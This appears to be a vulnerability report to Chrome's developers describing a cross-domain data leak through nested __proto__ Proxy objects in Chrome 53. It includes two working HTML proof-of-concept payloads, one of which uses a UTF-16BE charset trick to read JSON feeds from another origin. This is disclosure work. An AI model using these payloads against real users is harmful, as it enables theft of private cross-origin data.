<b>VULNERABILITY DETAILS</b>
Whilst doing some research at Portswigger I discovered that in Chrome JavaScript Proxies are leaking undefined JavaScript variables. Using this vulnerability I can steal data cross domain.

<script>
__proto__.__proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{
        has:function f(target,name){
                var str = f.caller.toString();
                alert(str);
        }
});
</script>
<script src="http://external-url/external-script"></script>

<!-- external script contains stealme -->

So although you've blocked a single __proto__ being overwritten with a proxy you forgot how deeply nested __proto__ can go :) what's interesting is that name doesn't leak the data but the caller does the undefined variable is actually a function, toString seems to be required in order to access the text.

It doesn't end there, using this technique I can use a UTF-16BE charset to steal JSON feeds provided that the characters converted combine to produce a valid JavaScript variable.

<script>
__proto__.__proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{
        has:function f(target,name){
                var str = f.caller.toString();
                alert(str.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));
        }
});
</script>
<script src="http://external-url/external-script" charset="UTF-16BE"></script>

<!-- external script contains {"abc":"testa"} -->

The anon function in the replace goes through each character and converts it from UTF-16BE by decoding the first and second byte. By shifting 8 bits for the first and masking for the second byte. What's interesting about UTF-16BE is that even new lines are converted since two byes form a character.

I've attached two test cases, one demonstrating the proxy steal vulnerability and one with the UTF-16BE charset vulnerability. Both files require modification to point to the correct external url.

<b>VERSION</b>
Chrome version 53.0.2785.143 64 bit Linux/Windows 10/OS X